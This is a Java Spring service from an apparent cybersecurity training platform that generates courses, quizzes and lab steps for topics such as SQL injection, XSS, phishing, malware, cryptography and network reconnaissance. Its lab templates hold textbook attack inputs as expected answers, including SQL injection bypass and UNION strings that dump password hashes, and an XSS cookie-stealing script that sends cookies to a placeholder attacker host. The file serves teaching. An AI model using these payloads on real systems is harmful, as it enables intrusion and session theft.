package com.vajraraksha.service;

import com.vajraraksha.model.*;
import com.vajraraksha.repository.CourseRepository;
import com.vajraraksha.repository.LabRepository;
import com.vajraraksha.repository.QuizRepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

@Service
@SuppressWarnings("null")
public class CourseGeneratorService {

        @Autowired
        private CourseRepository courseRepository;

        @Autowired
        private LabRepository labRepository;

        @Autowired
        private QuizRepository quizRepository;

        @Autowired
        private QuizGeneratorService quizGeneratorService;

        @Autowired
        private VideoGenerationService videoGenerationService;

        /**
         * Generates a full course structure with lessons, quizzes, and a lab.
         */
        public Course generateCourse(String title, String description) {
                Course course = new Course();
                course.setTitle(title);
                course.setDescription(description);
                course.setInstructorId("system-ai");

                List<Lesson> lessons = generateLessons(title);
                course.setLessons(lessons);

                course = courseRepository.save(course); // Save to get ID

                // Unique Quiz Generation Strategy
                // 1. Calculate total questions needed
                int questionsPerQuiz = 3;
                int totalQuestionsNeeded = lessons.size() * questionsPerQuiz;

                // 2. Fetch unique questions batch
                List<Question> uniqueQuestions = quizGeneratorService.getUniqueQuestions(title, totalQuestionsNeeded);

                // 3. Distribute to lessons
                for (int i = 0; i < lessons.size(); i++) {
                        // Slice the questions for this quiz
                        int start = i * questionsPerQuiz;
                        int end = Math.min(start + questionsPerQuiz, uniqueQuestions.size());
                        List<Question> lessonQuestions = new ArrayList<>(uniqueQuestions.subList(start, end));

                        // If for some reason we ran out (shouldn't happen with robust bank but safe
                        // fallback)
                        if (lessonQuestions.isEmpty()) {
                                // Fallback to purely random if exhausted
                                lessonQuestions = quizGeneratorService.getUniqueQuestions(title, questionsPerQuiz);
                        }

                        generateQuizForLesson(course.getId(), i, lessons.get(i), lessonQuestions);
                }

                // Generate a Lab
                generateLabForCourse(course.getId(), title, description);

                return course;
        }

        // Updated to include CourseId
        private void generateLabForCourse(String courseId, String title, String description) {
                // Default settings for Course-based automatic labs
                Lab lab = createLabObject(title, description, "Intermediate", 100);
                lab.setCourseId(courseId);
                labRepository.save(lab);
        }

        // Public method for standalone generation (Admin Controller)
        public void generateLabOnly(String title, String description, String difficulty, int points) {
                System.out.println("DEBUG: Service generating lab with difficulty: [" + difficulty + "]");
                Lab lab = createLabObject(title, description, difficulty, points);
                // No courseId for standalone labs
                labRepository.save(lab);
        }

        private Lab createLabObject(String title, String description, String difficulty, int points) {
                Lab lab = new Lab();
                String lowerTitle = title.toLowerCase();

                lab.setTitle("Lab: " + title);
                lab.setDescription(description);
                lab.setDifficulty(difficulty);
                lab.setPoints(points);

                String cleanDifficulty = difficulty != null ? difficulty.trim() : "Beginner";

                // --- SQL INJECTION ---
                if (lowerTitle.contains("sql")) {
                        if (lab.getTitle().equals("Lab: " + title))
                                lab.setTitle("Lab: " + title + " Playground");

                        if (cleanDifficulty.equalsIgnoreCase("Advanced")) {
                                lab.setSteps(Arrays.asList(
                                                new LabStep(1, "Identify Blind SQLi Vulnerability", "admin' AND 1=1 --",
                                                                "No Error / Constant Response",
                                                                "Analyze response times."),
                                                new LabStep(2, "Extract Database Version",
                                                                "' UNION SELECT @@version --", "5.7.35-log",
                                                                "Use UNION to extract data."),
                                                new LabStep(3, "Dump User Password Hash",
                                                                "' UNION SELECT password FROM users --",
                                                                "5f4dcc3b5aa765d61d8327deb882cf99",
                                                                "Find the users table.")));
                        } else if (cleanDifficulty.equalsIgnoreCase("Intermediate")) {
                                lab.setSteps(Arrays.asList(
                                                new LabStep(1, "Test logic error", "' OR '1'='1", "Login Successful",
                                                                "Test authentication bypass."),
                                                new LabStep(2, "Determine Column Count", "' ORDER BY 5 --",
                                                                "Error: Unknown column '5'",
                                                                "Find the number of columns."),
                                                new LabStep(3, "Union Based Injection", "' UNION SELECT 1,2,3,4 --",
                                                                "1,2,3,4 displayed on screen",
                                                                "Check for reflection.")));
                        } else { // Beginner
                                lab.setSteps(Arrays.asList(
                                                new LabStep(1, "Identify Input Field", "admin", "User not found",
                                                                "Locate the username field."),
                                                new LabStep(2, "Inject Single Quote", "'", "SQL Syntax Error",
                                                                "Test if input is sanitized."),
                                                new LabStep(3, "Simple Bypass", "' OR 1=1 --", "Welcome Admin",
                                                                "Use the classic tautology.")));
                        }

                        // --- XSS ---
                } else if (lowerTitle.contains("xss")) {
                        lab.setTitle("Lab: XSS Challenge");
                        if (cleanDifficulty.equalsIgnoreCase("Advanced")) {
                                lab.setSteps(Arrays.asList(
                                                new LabStep(1, "Bypass script tag filter",
                                                                "<img src=x onerror=alert(1)>",
                                                                "<img src=x onerror=alert(1)>", "Use event handlers."),
                                                new LabStep(2, "Steal Session Cookie",
                                                                "<script>fetch('http://attacker.com?c='+document.cookie)</script>",
                                                                "Request Sent", "Exfiltrate data.")));
                        } else if (cleanDifficulty.equalsIgnoreCase("Intermediate")) {
                                lab.setSteps(Arrays.asList(
                                                new LabStep(1, "Test for Stored XSS",
                                                                "<script>alert('Stored')</script>", "Alert Pop-up",
                                                                "Post a comment."),
                                                new LabStep(2, "Test Attribute Injection",
                                                                "\"><script>alert(1)</script>", "Alert Pop-up",
                                                                "Break out of the input tag.")));
                        } else { // Beginner
                                lab.setSteps(Arrays.asList(
                                                new LabStep(1, "Find Input Reflection", "<h1>Hello</h1>",
                                                                "<h1>Hello</h1> (Rendered)", "See if HTML tags work."),
                                                new LabStep(2, "Reflected XSS", "<script>alert(1)</script>",
                                                                "Alert Box", "Basic proof of concept.")));
                        }

                        // --- PHISHING ---
                } else if (lowerTitle.contains("phishing")) {
                        lab.setTitle("Lab: Phishing Analysis");
                        if (cleanDifficulty.equalsIgnoreCase("Advanced")) {
                                lab.setSteps(Arrays.asList(
                                                new LabStep(1, "Inspect Email Headers", "grep 'Return-Path' email.eml",
                                                                "Return-Path: <attacker@bad.com>", "Compare headers."),
                                                new LabStep(2, "Decode Obfuscated URL",
                                                                "base64 -d d3d3LmZha2UtYmFuay5jb20=",
                                                                "www.fake-bank.com", "Base64 decoding.")));
                        } else if (cleanDifficulty.equalsIgnoreCase("Intermediate")) {
                                lab.setSteps(Arrays.asList(
                                                new LabStep(1, "Identify Spoofed Link", "check_link href",
                                                                "http://secure-login.com.badsite.org",
                                                                "Check the full domain."),
                                                new LabStep(2, "Analyze Attachment", "file invoice.pdf.exe",
                                                                "PE32 executable", "Check file extensions.")));
                        } else { // Beginner
                                lab.setSteps(Arrays.asList(
                                                new LabStep(1, "Check Sender Address", "read_from",
                                                                "support@paypa1.com", "Look for typos (1 vs l)."),
                                                new LabStep(2, "Check Urgency", "scan_body", "URGENT: ACTION REQUIRED",
                                                                "Identify panic-inducing language.")));
                        }

                        // --- MALWARE ---
                } else if (lowerTitle.contains("malware") || lowerTitle.contains("ransomware")) {
                        lab.setTitle("Lab: Malware Sandbox");
                        if (cleanDifficulty.equalsIgnoreCase("Advanced")) {
                                lab.setSteps(Arrays.asList(
                                                new LabStep(1, "Reverse Engineering", "objdump -d suspicious.exe",
                                                                "assembly code...", "Analyze logic."),
                                                new LabStep(2, "Identify C2 Traffic", "tcpdump -r capture.pcap",
                                                                "POST /upload.php", "Look for exfiltration.")));
                        } else if (cleanDifficulty.equalsIgnoreCase("Intermediate")) {
                                lab.setSteps(Arrays.asList(
                                                new LabStep(1, "Check File Hash", "md5sum suspicious.exe",
                                                                "e80b...aad8", "Compare with VirusTotal."),
                                                new LabStep(2, "Check Strings", "strings suspicious.exe",
                                                                "http://c2.com", "Extract ASCII strings.")));
                        } else { // Beginner
                                lab.setSteps(Arrays.asList(
                                                new LabStep(1, "Identify File Type", "file suspicious.doc",
                                                                "Zip archive data (Macro enabled)",
                                                                "Is it really a doc?"),
                                                new LabStep(2, "Scan for Virus", "clamscan suspicious.doc",
                                                                "WIN.Trojan.Detected", "Run AV scan.")));
                        }

                        // --- CRYPTOGRAPHY ---
                } else if (lowerTitle.contains("crypto") || lowerTitle.contains("encryption")) {
                        lab.setTitle("Lab: Crypto Cracking");
                        if (cleanDifficulty.equalsIgnoreCase("Advanced")) {
                                lab.setSteps(Arrays.asList(
                                                new LabStep(1, "Crack MD5 Hash", "hashcat -m 0 hash.txt", "password123",
                                                                "Dictionary attack."),
                                                new LabStep(2, "Break Vigenere Cipher", "vigenere_solver 'Lxfopv'",
                                                                "Secret", "Key length analysis.")));
                        } else if (cleanDifficulty.equalsIgnoreCase("Intermediate")) {
                                lab.setSteps(Arrays.asList(
                                                new LabStep(1, "Decode Hex String", "xxd -r -p hex.txt", "Plaintext",
                                                                "Convert hex to ASCII."),
                                                new LabStep(2, "Analyze Frequency", "freq_analysis cipher.txt",
                                                                "E is most common", "Substitution cipher.")));
                        } else { // Beginner
                                lab.setSteps(Arrays.asList(
                                                new LabStep(1, "Decode Base64", "base64 -d msg.b64", "Hello World",
                                                                "Simple encoding."),
                                                new LabStep(2, "Caesar Cipher", "rot13 cipher.txt", "Cleartext",
                                                                "Shift by 13.")));
                        }

                        // --- NETWORK / FIREWALL ---
                } else if (lowerTitle.contains("network") || lowerTitle.contains("firewall")
                                || lowerTitle.contains("nmap")) {
                        lab.setTitle("Lab: Network Recon");
                        if (cleanDifficulty.equalsIgnoreCase("Advanced")) {
                                lab.setSteps(Arrays.asList(
                                                new LabStep(1, "Firewall Evasion", "nmap -f target_ip", "Open|Filtered",
                                                                "Fragment packets."),
                                                new LabStep(2, "Banner Grabbing", "nc -nv target_ip 80",
                                                                "Server: Apache/2.4", "Manual interaction.")));
                        } else if (cleanDifficulty.equalsIgnoreCase("Intermediate")) {
                                lab.setSteps(Arrays.asList(
                                                new LabStep(1, "Service Scan", "nmap -sV target_ip", "OpenSSH 7.9",
                                                                "Version detection."),
                                                new LabStep(2, "OS Detection", "nmap -O target_ip", "Linux 4.x",
                                                                "Identify operating system.")));
                        } else { // Beginner
                                lab.setSteps(Arrays.asList(
                                                new LabStep(1, "Ping Sweep", "ping -c 4 target_ip", "64 bytes from...",
                                                                "Check connectivity."),
                                                new LabStep(2, "Basic Port Scan", "nmap target_ip", "80/tcp OPEN",
                                                                "Find open ports.")));
                        }

                } else {
                        // General default with Difficulty Scaling
                        if (cleanDifficulty.equalsIgnoreCase("Advanced")) {
                                lab.setSteps(Arrays.asList(
                                                new LabStep(1, "Analyze Log Files", "grep 'ERROR' /var/log/syslog",
                                                                "Connection Refused", "Find the root cause."),
                                                new LabStep(2, "Fix Configuration", "vim /etc/config.conf", "Saved",
                                                                "Correct the port number."),
                                                new LabStep(3, "Restart Service", "systemctl restart app",
                                                                "Active (running)", "Apply changes.")));
                        } else if (cleanDifficulty.equalsIgnoreCase("Intermediate")) {
                                lab.setSteps(Arrays.asList(
                                                new LabStep(1, "Check File Permissions", "ls -l secret.txt",
                                                                "-rw-r--r--", "Who can read this?"),
                                                new LabStep(2, "Modify Permissions", "chmod 600 secret.txt", "",
                                                                "Restrict access."),
                                                new LabStep(3, "Verify Access", "cat secret.txt", "Permission denied",
                                                                "Confirm security.")));
                        } else { // Beginner
                                lab.setSteps(Arrays.asList(
                                                new LabStep(1, "List files in the directory", "ls",
                                                                "secret.txt  notes.md", "Use the list command."),
                                                new LabStep(2, "Read the secret file", "cat secret.txt",
                                                                "FLAG{AI_GENERATED_SUCCESS}",
                                                                "Concatenate the file content.")));
                        }
                }
                return lab;
        }

        private List<Lesson> generateLessons(String courseTitle) {
                List<Lesson> lessons = new ArrayList<>();
                lessons.add(new Lesson("Introduction to " + courseTitle,
                                "In this lesson, we will explore the fundamental concepts of " + courseTitle
                                                + ". Understanding these basics is crucial for preventing security vulnerabilities.",
                                videoGenerationService.getVideoForTopic("intro")));
                lessons.add(new Lesson("Deep Dive: " + courseTitle + " Attacks",
                                "Now we analyze how attackers exploit " + courseTitle
                                                + " vulnerabilities. We will look at real-world examples and attack vectors.",
                                videoGenerationService.getVideoForTopic(courseTitle)));
                lessons.add(new Lesson("Securing against " + courseTitle,
                                "Defense is the best offense. Learn the best practices, coding standards, and tools to secure your application against "
                                                + courseTitle + ".",
                                videoGenerationService.getVideoForTopic("defense")));
                return lessons;
        }

        private void generateQuizForLesson(String courseId, int lessonIndex, Lesson lesson,
                        List<Question> questions) {
                Quiz quiz = new Quiz();
                quiz.setTitle("Quiz: " + lesson.getTitle());
                // Link to specific lesson via ID convention: CourseId_LessonIndex
                quiz.setLessonId(courseId + "_" + lessonIndex);
                quiz.setQuestions(questions);
                quiz.setTotalPoints(questions.size() * 10);
                quizRepository.save(quiz);
        }
}
